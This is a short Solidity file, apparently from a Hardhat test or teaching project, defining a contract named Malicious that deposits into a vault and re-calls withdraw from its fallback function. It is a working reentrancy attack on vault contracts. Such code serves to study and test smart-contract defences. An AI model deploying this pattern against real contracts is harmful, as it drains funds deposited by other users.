// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "./IVault.sol";
import "hardhat/console.sol";

contract Malicious {
    IVault public vault;

    constructor(IVault _vault) {
        vault = _vault;
    }

    function addDeposit() external payable {
        vault.deposit{value: msg.value}();
    }

    function withdrawFromVault() external {
        vault.withdraw();
    }

    fallback() external payable {
        vault.withdraw();
    }
}
